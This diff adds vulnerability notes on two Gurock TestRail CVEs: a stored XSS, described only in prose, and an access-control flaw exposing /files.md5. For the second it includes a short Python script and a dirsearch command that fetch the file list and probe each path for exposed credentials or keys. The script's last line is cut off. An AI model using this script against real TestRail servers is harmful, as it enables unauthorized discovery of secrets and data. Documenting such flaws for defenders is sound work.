@@ -1,0 +1,54 @@
+***********************************************************************
+
+Gurock TestRail
+
+
+https://gist.github.com/miglen/b09498b4b9fe1be58973bd474af125ab
+
+
+Stored Cross-site scripting (XSS) vulnerability in Gurock TestRail before 7.1.2 allows an authenticated threat actors to inject arbitrary web script or HTML via the reference field in milestones or description fields in reports.
+
+Product: TestRail Version: Prior v7.1.2.1044 Vendor: Gurock
+
+https://cyber.vumetric.com/vulns/CVE-2021-44263/cross-site-scripting-vulnerability-in-gurock-testrail/
+
+https://www.cvedetails.com/vulnerability-list/vendor_id-13563/product_id-28196/Gurock-Testrail.html
+
+
+
+***********************************************************************
+
+CVE-2021-40875: Improper Access Control in Gurock TestRail versions ≤ 7.2.0.3014 results in sensitive file exposure
+
+Improper Access Control in Gurock TestRail versions < 7.2.0.3014 resulted in sensitive information exposure. A threat actor can access the /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. The corresponding file paths can be tested, and in some cases, result in the disclosure of hardcoded credentials, API keys, or other sensitive data.
+
+https://johnjhacking.com/blog/cve-2021-40875/
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40875
+
+https://github.com/SakuraSamuraii/derailed#usage
+
+
+_import os  
+import sys  
+import pycurl  
+from io import BytesIO  
+\# Grabbing the results of the files.md5 endpoint  
+b_obj = BytesIO()  
+crl = pycurl.Curl()  
+crl.setopt(crl.URL, input("Enter the URL of the Testrail App: ")+'/files.md5')  
+crl.setopt(crl.WRITEDATA, b_obj)  
+crl.perform()  
+crl.close()  
+get_body = b_obj.getvalue()  
+result = get_body.decode('utf8')  
+with open('dirlist.txt', 'w') as f:  
+f.write(result)  
+\# Fixing the results  
+os.system("awk '{print $2}' dirlist.txt > sorted.txt")  
+os.system("sed 's/^/\\//' sorted.txt > derailed.
+
+
+sudo dirsearch -w derailed.txt -u 'https://foo.com' -x 300,301,302,303,304,305,400,401,402,403,404,405,406,500,501,502,503,504 > paths.txt
+
+***********************************************************************
